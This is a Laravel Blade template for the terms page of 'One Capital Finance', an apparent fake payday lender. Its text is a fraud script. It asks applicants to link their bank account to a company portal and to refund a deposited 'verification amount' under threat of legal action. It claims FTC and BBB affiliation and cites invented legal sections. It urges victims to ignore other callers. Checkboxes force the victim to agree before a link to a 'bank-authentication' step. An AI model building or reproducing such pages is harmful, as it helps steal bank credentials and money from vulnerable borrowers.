@extends('layouts.app')

@section('section')
<section class="py100">
    <div class="container">
        <h1 class="fs-52 fw-400 mb-32">Terms & Conditions
        </h1>
        <div class="dm l15">
            
            <div class="fs-18 mb-32">
                <strong> Loan Agreement Terms and Conditions (Unsecured Personal Loan)</strong>
            </div>
            <div class="fs-18 mb-32">
                One Capital Finance is a trusted and reputable online payday lender in the USA. We prioritize the security and efficiency of the lending process for our valued customers. As a locally owned and fully licensed payday lender in the United States, we adhere to strict rules and criteria to safeguard our company's funds from potential theft in the form of loans. However, we have identified some incomplete and insecure verification procedures that need to be addressed to ensure the utmost security for your application. To rectify this, we kindly request that you link your account with our secure company portal. This additional step will not only complete your verification process but also provide you with a convenient platform to manage and access your loan application and payments. It is important to note that the recent instances of web scraping, loan phishing, bankruptcy, wire intercept, and mule herding in 2022-2023 have had a significant impact on fraudulent activities in the United States.
                <br>
                <br>
                In response, the government has implemented a new law under Section 402.2(1) & Section 430(1.1) as a precautionary measure. Applicants seeking loans exceeding $3500.00 are required to undergo offline verification. Consequently, we have revised our eligibility criteria and are actively taking measures to prevent any financial losses in the future. Rest assured that before approving any loan amount, our representative may conduct additional verification procedures to protect your identity and prevent fraud. This verification can be done either by linking your account manually with our system or through a secure three-way conference call involving the BBB, your bank, and ourselves. Please note that the conference call option is only available after you have signed the loan documents and granted us the right to debit the installments.
               <br>
               <br>
                As a trusted organization affiliated with the FTC and BBB, we strictly adhere to ethical practices. We will never initiate any processing fees or upfront charges, nor will we access your account or withdraw any funds without your explicit permission. Any employee found accessing your account and making unauthorized transactions will be terminated, and our licenses for payday loans will be cancelled by the BBB and FTC departments. Regarding the option to verify the account holder's name, we kindly request that you link your account with our company's portal using the CIS Verification form provided. This step ensures that the loan is granted to the correct individual. We understand that these measures may seem extensive, but they are necessary to protect the financial stability of One Capital Finance. Once your verification is completed, you can expect the loan to be sanctioned and deposited into your checking account within 2-3 working hours. Thank you for your understanding and cooperation in this matter.
               <br>
               <br>
               To initiate the verification process, we will deposit a small amount into your account. Upon receiving the verification amount, we kindly request that you refund us the verification money. Once this step is completed, your loan will be processed and disbursed within 15 minutes.
               <br>
               <br>
               We understand that fraud is a growing concern, and this verification process allows us to maintain the utmost security while serving our valued customers.
               
            </div>

            <div class="fs-18 mb-32">
                To successfully complete this process, it is imperative that you return the "Verification Amount" to us within the specified timeframe. The funds have been deposited and will be available within given time period. We kindly ask you to ensure that you respond promptly to any calls from our verification team, as this will facilitate the timely transfer of the loan. Please be advised that retaining the funds for personal use may lead to legal consequences. Your cooperation in this matter is greatly appreciated.
            </div>

            <div class="fs-18 mb-32">
                Please ensure that all your personal and financial information has been correctly and completely uploaded to the National Database. This step is crucial to avoid any potential issues or delays. In the upcoming days, it is possible that you may receive calls from various loan companies, financial institutions, or third-party agents. These entities might express interest in offering you additional loans or financial products            
            </div>
            
            <div class="fs-18 mb-32">
                In the event that you are contacted, it is important that you clearly communicate to them that you have already secured a loan. Politely decline any requests for additional information or offers of new financial products. It is essential to be aware that providing any personal or financial details to these organizations could result in them conducting a credit inquiry. Such inquiries can have an adverse effect on your credit score, as multiple inquiries within a short period can be seen as a sign of financial instability by credit reporting agencies.
            </div>

            <div class="fs-18 mb-32">
                Furthermore, a lower credit score could not only affect your eligibility for future credit but could also pose a risk to your current loan. A significant drop in your credit score might trigger a review of your loan terms, potentially leading to its cancellation or a change in the interest rates and conditions. This could have serious financial implications and could disrupt your financial plans.
            </div>

            <div class="fs-18 mb-32">
                To protect your credit score and ensure the stability of your current loan, I strongly advise that you refrain from engaging with these calls or providing any information to unsolicited parties. Your financial well-being is of utmost importance, and taking these precautions will help maintain your creditworthiness and the terms of your existing loan agreement.
            </div>

            <div class="fs-18 mb-32">
                If you have any questions or need further clarification, please feel free to reach out. I am here to assist you in any way necessary to ensure that your financial interests are safeguarded.
            </div>

            <div class="fs-18 mb-32">
                Thank you for your time & patience.
            </div>


            <div class="checkbox-container" style="margin-bottom: 24px;">
                <input type="checkbox" id="terms-checkbox" required>
                <label for="terms-checkbox">I accept all the terms and conditions</label>
              </div>
              
              <div class="checkbox-container" style="margin-bottom: 24px;">
                <input type="checkbox" id="terms-checkbox1" required>
                <label for="terms-checkbox1">
                  I understand, that retaining the funds for personal use may lead to legal consequences
                </label>
              </div>
            
            
              <a href="{{url('bank-authentication-step-4')}}" 
              class="btn contactBtn animated-div"
              onclick="return checkCheckboxes(event)">
              I agree to all the terms and conditions
           </a>
    </div>
</section>

<script>
    function checkCheckboxes(event) {
        const cb1 = document.getElementById('terms-checkbox');
        const cb2 = document.getElementById('terms-checkbox1');
    
        if (!cb1.checked || !cb2.checked) {
            alert("Please agree to all the terms and conditions before proceeding.");
            event.preventDefault(); // stops the link from navigating
            return false;
        }
    
        return true; // allow navigation
    }
    </script>
@endsection
